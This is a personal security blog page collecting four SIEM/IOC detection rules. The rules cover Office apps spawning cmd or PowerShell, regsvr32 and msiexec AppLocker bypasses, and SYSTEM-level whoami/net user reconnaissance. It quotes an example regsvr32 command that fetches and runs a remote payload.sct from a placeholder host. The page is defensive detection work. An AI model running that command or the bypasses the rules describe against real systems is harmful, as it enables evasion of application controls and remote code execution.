---
layout: page
title: Detection Stack
subtitle: A compilation of IOC and SIEM rules for modern threats
tags: [security control, siem, ips, ioc, correlation rule, detection, mitigation, threat, darkquasar]
comments: true
---

* TOC
{:toc}

# Summary
This is my collection of detection logics for current threats as it results from personal research. As the list grows, I will develop a framework that will encapsulate everything in a table. Eventually this will also be retrievable in JSON format. 

# Detection Logics

## 001 - Powershell or Cmd spawned by Office Application
This IOC is meant to capture covert instances of cmd or powershell spawned by Microsoft Office applications as a result of exploit activity. The delivery method can be multiple: email with attachments, link in emails, Word documents, Power Point presentations, Excel spreadsheets, etc. 

### Logic
```
Path of Parent Process *contains* "office"
Process Name *contains* "powershell" or "cmd"
Path of Parent Process *not equals* "C:\Program Files\Microsoft Office 15\ClientX64\officeclicktorun.exe" or "C:\Program Files\Microsoft Office Servers\15.0\Synchronization Service\Bin\miiserver.exe" or "C:\Program Files\Common Files\Microsoft Shared\OfficeSoftwareProtectionPlatform\OSPPSVC.EXE"
```
### False Positives
Medium FP ratio

## 002 - Applocker Bypass Methodology 01: regsvr32.exe launching script
This IOC will detect instances of AppLocker bypass methodologies as well as stealth malicious program executions. When regsvr32 launches with some parameters involving a URL it may indicate malicious intent. For example: *regsvr32 /u /n /s /i:http://ip:port/payload.sct scrobj.dll*

### Logic
The detection needs to reflect the fact that regsvr32.exe might be changed to any other name and still be regsvr32. 
```
Process CommandLine *contains* ("regsvr32" AND "http") OR ("/i" AND "http" AND "scrobj.dll")
```
### False Positives
Low FP ratio

## 003 - APT Activity 01: gathering info from victim
This IOC will aims to detect instances of cmd.exe being launched under certain conditions: 1) the account must be NT AUTHORITY\SYSTEM, 2) the process commandline must contain either "whoami" or "net user" which are, in multiple combinations and with different switches (like *net user /groups*) used to gather intel about the current user status in the system after an initial compromise.

### Logic
```
Process Name *equals* "cmd.exe"
Process CommandLine *contains* "whoami" OR "net user"
Process UserName *contains* "SYSTEM"
```
### False Positives
Low FP ratio

## 004 - Applocker Bypass Methodology 02: MSIEXEC.EXE
Msiexe.exe can be used to launch covert applications either over the network or locally. It can even execute code from a script renamed to a .png file!.

### References 
https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/

### Logic
```
Process Name *equals* "msiexec.exe"
Process CommandLine *contains* "http" OR ".png"
```
### False Positives
Medium FP ratio
